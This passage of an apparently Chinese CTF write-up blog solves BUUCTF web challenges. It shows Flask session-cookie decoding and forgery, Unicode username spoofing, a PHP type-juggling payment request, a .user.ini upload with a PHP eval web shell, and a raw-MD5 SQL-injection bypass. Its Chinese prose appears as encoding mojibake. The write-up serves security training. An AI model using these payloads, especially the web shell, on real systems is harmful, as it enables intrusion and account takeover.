</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>zlib</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>base64</span> <span class=kn>import</span> <span class=n>b64decode</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask.sessions</span> <span class=kn>import</span> <span class=n>session_json_serializer</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>itsdangerous</span> <span class=kn>import</span> <span class=n>base64_decode</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decryption</span><span class=p>(</span><span class=n>payload</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span><span class=p>,</span> <span class=n>sig</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>rsplit</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;.&#39;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span><span class=p>,</span> <span class=n>timestamp</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>rsplit</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;.&#39;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>decompress</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>payload</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;.&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=p>[</span><span class=mi>1</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>        <span class=n>decompress</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=n>base64_decode</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>Exception</span><span class=p>(</span><span class=s1>&#39;Could not base64 decode the payload because of &#39;</span>
</span></span><span class=line><span class=cl>                         <span class=s1>&#39;an exception&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>decompress</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=n>zlib</span><span class=o>.</span><span class=n>decompress</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>raise</span> <span class=ne>Exception</span><span class=p>(</span><span class=s1>&#39;Could not zlib decompress the payload before &#39;</span>
</span></span><span class=line><span class=cl>                             <span class=s1>&#39;decoding the payload&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>session_json_serializer</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>decryption</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>encode</span><span class=p>()))</span>
</span></span></code></pre></td></tr></table></div></div><p>æ‰§è¡Œå‘½ä»¤</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python run.py .eJw90MGKwkAMBuBXWXL2YLvuRfAgjBaFpFRGh8lFdK1tpxOFqmwd8d131gVvIX_4SPKA7bErLzWMr92tHMC2OcD4AR97GIPVOKIU-zzDgI4bDAeP2cZhWAcSO0SzcpiuhM26R1OMYi8h4faVSZGyniYYqk8y7FgdmlzFOV1LrufCat6gxpSikRu8WzMLrNqE1CJFXYzYRMmwZ-HahmXNGTkKi7sNbUpq6aP_xcpLrthbZyfwHMD3pTtur-e2PL1PyP_IUAWKS1uZ9Si2JzP3nLGg4NA6TMjYH9bexbonXXsuJi-ukV1VvqVi4xer6X9y2kkMoLqd97tTBQO4Xcru9TlIhvD8BSJwb7A.YELi9g.D_opOsSTFKn3wKeMF1rcGksx5HA
</span></span></code></pre></td></tr></table></div></div><p>ç»“æœ</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;a387c18c326b37e0ec3536f41dc3dfee11d86f56fd6f42d6e053875fcd7b85118f91fd1b1365dc9c2aa3d95426148ecfefeffac2adcc722c9642e2d9d9f86eb6&#39;, &#39;csrf_token&#39;: b&#39;895783633ba12f15aedff2c4b355f0e9cb3158ee&#39;, &#39;image&#39;: b&#39;AYHD&#39;, &#39;name&#39;: &#39;guobang&#39;, &#39;user_id&#39;: &#39;10&#39;}
</span></span></code></pre></td></tr></table></div></div><p>ç„¶åæˆ‘ä»¬éœ€è¦å§<code>name</code>çš„å€¼ä¿®æ”¹ä¸º<code>admin</code>ã€‚ä¿®æ”¹å®Œæˆä»¥åè¿˜éœ€è¦å›åˆ°åŸæ¥çš„sessionæ ¼å¼ï¼Œé‚£ä¹ˆå°±éœ€è¦ç”¨åˆ°ä¸€ä¸ªåŠ å¯†flaskçš„å·¥å…·ï¼š<a class=link href=https://github.com/noraj/flask-session-cookie-manager target=_blank rel=noopener>flask-session-cookie-manager</a></p><blockquote><p>è¿™ä¸ªå·¥å…·ä¹Ÿå¯ä»¥ç”¨æ¥è§£å¯†ã€‚æˆ‘æ•´ç†çš„ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼Œè®°å¾—è¦ç”¨åŒå¼•å·<code>""</code>æ‹¬èµ·æ¥</p><p>python flask_session_cookie_manager{2,3}.py {encode,decode}</p><p>-s &ldquo;SECRET_KEY&rdquo; éƒ½éœ€è¦ä½¿ç”¨
-c &ldquo;Session cookie value&rdquo; sessionçš„å€¼ åªæœ‰è§£å¯†decodeç”¨å¾—åˆ°
-t &ldquo;Session cookie structure&rdquo; cookieç»“æ„ åªæœ‰encodeç”¨å¾—</p></blockquote><p>æ‰§è¡Œ</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python flask_session_cookie_manager3.py encode -s &#34;ckj123&#34; -t &#34;{&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;a387c18c326b37e0ec3536f41dc3dfee11d86f56fd6f42d6e053875fcd7b85118f91fd1b1365dc9c2aa3d95426148ecfefeffac2adcc722c9642e2d9d9f86eb6&#39;, &#39;csrf_token&#39;: b&#39;895783633ba12f15aedff2c4b355f0e9cb3158ee&#39;, &#39;image&#39;: b&#39;AYHD&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;}&#34;
</span></span></code></pre></td></tr></table></div></div><p>å¾—åˆ°</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>.eJw90MGKwkAMBuBXWXL2YLvdi-BBGC0KSamMDpOLuNtqO524UJWtI777zrrgLeQPH0nusDv09bmByaW_1iPYtRVM7vD2CROwGjNKcShyDOi4xVB5zLcOwyaQ2DGatcN0LWw2A5oyi72EhLtnJmXKepZgOL6TYceqagsV53QjhV4Iq0WLGlOKRmHwZs08sOoSUssUdZmxiZJhz8KNDauGc3IUljcbupTUykf_g5WXQrG3zk7hMYKvc3_YXb67-vQ6ofgjwzFQXNrKfECxA5mF55wFBcfWYULG_rD2LtYD6cZzOX1yreyP9Usqt365nv0np73EAPaVtCcYwfVc98-_QTKGxy8-U27W.YELpfA.vD1SVCAxOcwOPXc_DbwFqJT1TRg
</span></span></code></pre></td></tr></table></div></div><p>æ”¾åœ¨è¯·æ±‚å¤´ä¸­ï¼Œæ ¼å¼ä¸º</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cookie: session=åŠ å¯†å†…å®¹
</span></span></code></pre></td></tr></table></div></div><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210306103214.png loading=lazy></p><h2 id=è§£æ³•äºŒunicodeæ¬ºéª—>è§£æ³•äºŒï¼šUnicodeæ¬ºéª—</h2><p>ç¬¬äºŒç§æ–¹æ³•æ˜¯åˆ©ç”¨ä»£ç ä¸­çš„strlower()å‡½æ•°çš„ä½¿ç”¨ä¸å½“ã€‚è¿™ä¸ªå‡½æ•°åˆ†åˆ«åœ¨æ³¨å†Œã€ç™»é™†ã€ä¿®æ”¹å¯†ç çš„åœ°æ–¹å‡ºç°ä¸‰æ¬¡ã€‚è¿™ä¸ªæ–¹æ³•çš„æ€è·¯å°±æ˜¯unicodeåŠ å¯†ä¸‰å±‚ï¼Œåœ¨æœ€åä¸€å±‚ä¿®æ”¹å¯†ç æ—¶æ‰§è¡Œå‡½æ•°strlower()åä¿®æ”¹åˆ°adminçš„å¯†ç ã€‚è¿‡ç¨‹ä¸º</p><blockquote><p>á´¬á´°á´¹á´µá´º&mdash;&mdash;æ³¨å†Œå&mdash;&mdash;>ADMIN&mdash;ä¿®æ”¹å¯†ç &mdash;>admin</p></blockquote><p>payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>á´¬á´°á´¹á´µá´º
</span></span></code></pre></td></tr></table></div></div><p>æ³¨å†Œä»¥åä½¿ç”¨<code>á´¬á´°á´¹á´µá´º</code>ç™»é™†ï¼Œç„¶åä¿®æ”¹å¯†ç æ—¶å®é™…ä¿®æ”¹çš„å°±æ˜¯adminçš„å¯†ç äº†ï¼Œç„¶åç™»é™†adminå³å¯ã€‚</p><hr><h1 id=æå®¢å¤§æŒ‘æˆ˜-2019buyflag>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h1><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121104213.png loading=lazy>ç½‘ç«™é¢˜ç›´æ¥å»çœ‹æºç ï¼Œåœ¨æºç ä¹Ÿæœç´¢phpæœ‰ä¸¤ä¸ªï¼šindex.phpã€pay.phpã€‚å‰è€…æ˜¯é¦–é¡µï¼Œç›´æ¥çœ‹åé¢çš„é‚£ä¸ªï¼Œæ‰“å¼€å°±æœ‰æç¤º</p><blockquote><p>Only Cuit&rsquo;s students can buy the FLAG</p></blockquote><p>åº”è¯¥è¿˜æ˜¯ä¸€é“httpçš„å¥—å¨ƒé¢˜ã€‚æŸ¥çœ‹ç½‘é¡µçš„è¯·æ±‚å‘ç°Cookieä¸­æœ‰ä¸€ä¸ªuser=0ï¼Œå¾ˆå¯ç–‘ï¼Œæ”¹æˆuser=1ï¼Œæœ‰äº†ä¸‹ä¸€ä¸ªæç¤ºï¼šè¾“å…¥å¯†ç ï¼Œå¹¶ä¸”æºç ä¸­æœ‰ä¸€æ®µphp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;!--
</span></span><span class=line><span class=cl>	~~~post money and password~~~
</span></span><span class=line><span class=cl>if (isset($_POST[&#39;password&#39;])) {
</span></span><span class=line><span class=cl>	$password = $_POST[&#39;password&#39;];
</span></span><span class=line><span class=cl>	if (is_numeric($password)) {
</span></span><span class=line><span class=cl>		echo &#34;password can&#39;t be number&lt;/br&gt;&#34;;
</span></span><span class=line><span class=cl>	}elseif ($password == 404) {
</span></span><span class=line><span class=cl>		echo &#34;Password Right!&lt;/br&gt;&#34;;
</span></span><span class=line><span class=cl>	}
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>è¿˜è®°å¾—php<code>==</code>å…³ç³»è¿ç®—ä¼šå¼ºåˆ¶è½¬æ¢ç±»å‹ï¼Œç”¨POSTä¼ ä¸€ä¸ªpassword=404aï¼Œ<code>404a</code>ä¼šè¢«å¼ºåˆ¶è½¬æ¢ä¸º<code>404</code>ï¼Œå¯†ç å°±å¯¹ä¸Šäº†ã€‚æ¥ä¸‹æ¥æ˜¯é’±çš„é—®é¢˜ï¼Œflagéœ€è¦<strong>100000000</strong>å—é’±æˆ‘ä»¬ä¹Ÿå»è¦ä¼ è¿‡å»ã€‚å¦‚æœç›´æ¥ä¼ å…¥è¿™ä¹ˆé•¿çš„ä¼šæç¤ºå­—ç¬¦ä¸²è¿‡é•¿ï¼Œæ‰€ä»¥æˆ‘æƒ³åˆ°äº†ç§‘å­¦è®¡æ•°æ³•ï¼Œ<code>10e10</code>ï¼Œå°±æ˜¯10çš„10æ¬¡æ–¹ï¼Œé€šè¿‡ã€‚æœ€ç»ˆçš„è¯·æ±‚ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /pay.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: 268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn
</span></span><span class=line><span class=cl>Content-Length: 25
</span></span><span class=line><span class=cl>Cache-Control: max-age=0
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>Origin: http://268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
</span></span><span class=line><span class=cl>Referer: http://268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn/pay.php
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9
</span></span><span class=line><span class=cl>Cookie: user=1
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>password=404a&amp;money=10e10
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=suctf-2019checkin>[SUCTF 2019]CheckIn</h1><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210201103750.png loading=lazy></p><p>çŸ¥è¯†ç‚¹</p><blockquote><p>.user.iniã€‚å®ƒæ¯”.htaccessç”¨çš„æ›´å¹¿ï¼Œä¸ç®¡æ˜¯nginx/apache/IISï¼Œåªè¦æ˜¯ä»¥fastcgiè¿è¡Œçš„phpéƒ½å¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•ã€‚å¯è°“å¾ˆå¹¿ï¼Œä¸åƒ.htaccessæœ‰å±€é™æ€§ï¼Œåªèƒ½æ˜¯apache.</p></blockquote><p>å‡†å¤‡å¥½.user.iniæ–‡ä»¶å†…å®¹ä¸ºè‡ªåŠ¨åŒ…å«å›¾ç‰‡é©¬ï¼Œå› ä¸ºä¸Šä¼ ä¼šæ£€æŸ¥æ–‡ä»¶å¤´ï¼Œæ‰€ä»¥æ·»åŠ äº†ä¸€ä¸ªGIFæ–‡ä»¶å¤´ä¼ªè£…ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GIF89a
</span></span><span class=line><span class=cl>auto_prepend_file=233.gif
</span></span></code></pre></td></tr></table></div></div><p>æ¥ä¸‹æ¥ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œå°è¯•äº†æ­£å¸¸ä¸Šä¼ PHPé©¬ä¼šæç¤ºï¼š</p><blockquote><p>&lt;? in contents!</p></blockquote><p>æ‰€ä»¥ä½¿ç”¨scripté©¬æ‰§è¡Œphpï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GIF89a
</span></span><span class=line><span class=cl>&lt;script language=&#34;php&#34;&gt;eval($_REQUEST[shell])&lt;/script&gt;
</span></span></code></pre></td></tr></table></div></div><p>ä¸Šä¼ æˆåŠŸåä¼šæç¤ºæ–‡ä»¶è·¯å¾„ï¼š</p><blockquote><p>Your dir uploads/852aff287f54bca0ed7757a702913e50
Your files :
array(5) { [0]=> string(1) &ldquo;.&rdquo; [1]=> string(2) &ldquo;..&rdquo; [2]=> string(9) &ldquo;.user.ini&rdquo; [3]=> string(7) &ldquo;233.gif&rdquo; [4]=> string(9) &ldquo;index.php&rdquo; }</p></blockquote><p>è¿™æ—¶å€™.user.iniæ–‡ä»¶å·²ç»ä¼šå¸®æˆ‘ä»¬è‡ªåŠ¨åŒ…å«å›¾ç‰‡é©¬äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è®¿é—®ä¸€ä¸ªPHPæ–‡ä»¶å³å¯ï¼Œæ­£å¥½ä¸Šä¼ ç›®å½•ä¸‹æœ‰ä¸€ä¸ªindex.phpæ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥èšå‰‘è¿æ¥æˆ–è€…POSTè¯·æ±‚system(&lsquo;cat /flag&rsquo;)ã€‚</p><hr><h1 id=bjdctf2020easy-md5>[BJDCTF2020]Easy MD5</h1><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210201105021.png loading=lazy></p><p>å‚è€ƒï¼š</p><blockquote><p><a class=link href=https://www.jianshu.com/p/12125291f50d target=_blank rel=noopener>ã€Jarvis OJã€‘Login&ndash;password=&rsquo;".md5($pass,true)."</a></p><p><a class=link href=https://blog.csdn.net/March97/article/details/81222922 target=_blank rel=noopener>sqlæ³¨å…¥ï¼šmd5($password,true)</a></p><p><a class=link href=http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/ target=_blank rel=noopener>Leet More 2010 Oh Those Admins! writeup</a></p></blockquote><p>éšä¾¿è¾“å…¥ä¸€äº›ä¸œè¥¿éƒ½æ²¡æœ‰ååº”ï¼Œåœ¨è¯·æ±‚å¤´ä¸­å‘ç°äº†ä¸€ä¸ªHintï¼š</p><blockquote><p>select * from &lsquo;admin&rsquo; where password=md5($pass,true)</p></blockquote><p><strong>è¯­æ³•</strong></p><p><strong>md5(string,raw)</strong></p><div class=table-wrapper><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>string</td><td>å¿…éœ€ã€‚è¦è®¡ç®—çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td>raw</td><td>å¯é€‰ã€‚é»˜è®¤ä¸å†™ä¸ºFALSEã€‚32ä½16è¿›åˆ¶çš„å­—ç¬¦ä¸²TRUEã€‚16ä½åŸå§‹äºŒè¿›åˆ¶æ ¼å¼çš„å­—ç¬¦ä¸²</td></tr></tbody></table></div><p>æ¦‚æ‹¬ç†è§£ï¼Œè¿™é‡Œå¦‚æœrawå‚æ•°ä¸º<code>true</code>çš„è¯ï¼Œè¿™ä¸ªå‡½æ•°çš„è¿”å›å€¼æ˜¯<code>string</code>çš„md5åŠ å¯†å€¼è¿›è¡Œåå…­è¿›åˆ¶è§£ç çš„å­—ç¬¦ä¸²ã€‚è¿™é“é¢˜æˆ‘å½“æ—¶æ˜¯ç›´æ¥çœ‹äº†æºç è·³è¿‡äº†ç¬¬ä¸€å±‚ï¼Œç¬¬ä¸€å±‚çš„ç­”æ¡ˆå…¶å®æ˜¯<code>ffifdyop</code>ï¼Œæˆ‘ä»¬æ¥å¯¹å®ƒè¿›è¡Œä¸€æ³¢æ“ä½œ</p><ul><li><p>æºå­—ç¬¦ä¸²ï¼šffifdyop</p></li><li><p>md5åŠ å¯†å€¼ï¼š276f722736c95d99e921722cf9ed621c</p></li><li><p>hexè§£ç ï¼š&lsquo;or'6Ã‰].Ã©!r,Ã¹Ã­b.</p></li></ul><p>æœ€åé‚£å‡ ä¸ªåº”è¯¥æ˜¯ä¸å¯è§å­—ç¬¦ï¼Œé‡è¦çš„æ˜¯å‰é¢ä¸€æ®µï¼š<code>'or'6</code>ï¼Œè¿™é‡Œè¿˜è¦è¯´æ˜ä¸€ä¸‹ï¼Œè¿™æç¤ºåº”è¯¥ä¸ç®—ä¸¥è°¨ï¼ŒçœŸæ­£çš„sqlè¯­å¥åº”è¯¥æ˜¯åœ¨md5å‡½æ•°å‰åå„ä¸€ä¸ª<code>'</code>å•å¼•å·ã€‚æ‰§è¡Œä»¥åçœŸæ­£çš„sqlè¯­å¥ä¸º</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>select * from &#39;admin&#39; where password=&#39;&#39;or&#39;6Ã‰].Ã©!r,Ã¹Ã­b.â€˜
</span></span></code></pre></td></tr></table></div></div><p>å¯ä»¥çœ‹åˆ°åŸç†æ˜¯æ„æˆä¸€ä¸ªé—­åˆï¼Œè¿™é‡Œè¿˜æœ‰ç¬¬äºŒä¸ªçŸ¥è¯†ç‚¹ï¼Œæ˜¯oråé¢çš„å­—ç¬¦ä¸²è¢«è®¤ä¸ºæ˜¯trueï¼Œå¼•ç”¨æ–‡ç« é‡Œçš„ä¸€æ®µï¼š</p><blockquote><p>a string starting with a <code>1</code> is cast as an integer when used as a boolean.</p><p>åœ¨mysqlé‡Œé¢ï¼Œåœ¨ç”¨ä½œå¸ƒå°”å‹åˆ¤æ–­æ—¶ï¼Œä»¥1å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«å½“åšæ•´å‹æ•°ã€‚è¦æ³¨æ„çš„æ˜¯è¿™ç§æƒ…å†µæ˜¯å¿…é¡»è¦æœ‰å•å¼•å·æ‹¬èµ·æ¥çš„ï¼Œæ¯”å¦‚password=â€˜xxxâ€™ or â€˜1xxxxxxxxxâ€™ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºpassword=â€˜xxxâ€™ or 1 ï¼Œä¹Ÿå°±ç›¸å½“äºpassword=â€˜xxxâ€™ or trueï¼Œæ‰€ä»¥è¿”å›å€¼å°±æ˜¯trueã€‚å½“ç„¶åœ¨æˆ‘åæ¥æµ‹è¯•ä¸­å‘ç°ï¼Œä¸åªæ˜¯1å¼€å¤´ï¼Œåªè¦æ˜¯æ•°å­—å¼€å¤´éƒ½æ˜¯å¯ä»¥çš„ã€‚</p></blockquote><p>è‡ªå·±è¿›è¡Œçš„æµ‹è¯•ï¼š</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210201113825.png loading=lazy></p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210201113839.png loading=lazy></p><p>æ‰€ä»¥çœŸæ­£çš„è§£æ³•æ˜¯åªè¦sqlè¯­å¥çš„æ ¼å¼ä¸ºpassword=&lsquo;xxxxxxxx&rsquo; or &lsquo;1xxxx&rsquo;ï¼Œå³hexåŒ…å«å­—ç¬¦ä¸²"276f722731"ï¼ˆ&lsquo;or'1ï¼‰ï¼Œå…¶å®oråé¢å¼€å¤´åªè¦æ˜¯æ•°å­—å³å¯ï¼Œ1-9çš„hexèŒƒå›´ä¸º31-39ã€‚</p><p>ä¸‹é¢è¿™ä¸ªç¨‹åºæ˜¯è¿™é“é¢˜å¼€å¤´å‚è€ƒåˆ—è¡¨ä¸­çš„ç¬¬ä¸‰ä¸ªé“¾æ¥ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php 
</span></span><span class=line><span class=cl>for ($i = 0;;) { 
</span></span><span class=line><span class=cl> for ($c = 0; $c &lt; 1000000; $c++, $i++)
</span></span><span class=line><span class=cl>  if (stripos(md5($i, true), &#39;\&#39;or\&#39;&#39;) !== false)
</span></span><span class=line><span class=cl>   echo &#34;\nmd5($i) = &#34; . md5($i, true) . &#34;\n&#34;;
</span></span><span class=line><span class=cl> echo &#34;.&#34;;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></td></tr></table></div></div><p>è¿™ä¸ªç¨‹åºéå†æ•°å­—è¿›è¡Œmd5åŠ å¯†ï¼Œä½¿ç”¨striposåŒ¹é…æ˜¯å¦æœ‰<code>'or'</code>ï¼Œè¿™ä¸ªå‡½æ•°æœ‰ä¸€ä¸ªå¼Šç—…å°±æ˜¯å¦‚æœæ˜¯ä»¥<code>'or'</code>å¼€å¤´çš„ä¸ä¼šåŒ¹é…åˆ°ï¼Œå¹¶ä¸”æˆ‘ä»¬éœ€è¦çš„æ˜¯oråé¢ä»¥æ•°å­—å¼€å¤´éƒ½å¯ä»¥ï¼Œæ‰€ä»¥éœ€è¦ç¨å¾®åšä¸€äº›ä¿®æ”¹ï¼Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ç”±<code>\'or\'</code>æ”¹ä¸º<code>'or'([1-9]+|0+[1-9])</code> <del>ä¸è¿‡æˆ‘çš„æ–¹æ³•è‡ªå·±è¿˜æ²¡è·‘å‡ºæ¥ğŸ¤£ï¼Œå›å¤´åŠ ä¸ªå¤šçº¿ç¨‹è¯•ä¸€è¯•</del></p><p>ï¼ˆæ›´æ–°ï¼‰</p><p>è‡ªå·±å†™äº†ä¸€ä¸ªpythonç¨‹åºï¼Œæ”¾åœ¨å­¦ç”ŸæœåŠ¡å™¨ä¸Šè·‘äº†ä¸€ä¸ªä¸‹åˆåŠ ä¸€ä¸ªæ™šä¸Šï¼Œå‡ºäº†ä¸¤ä¸ªç­”æ¡ˆï¼Œå¥½å®¶ä¼™ä»1è·‘åˆ°52äº¿ï¼š</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210203094304.png loading=lazy></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
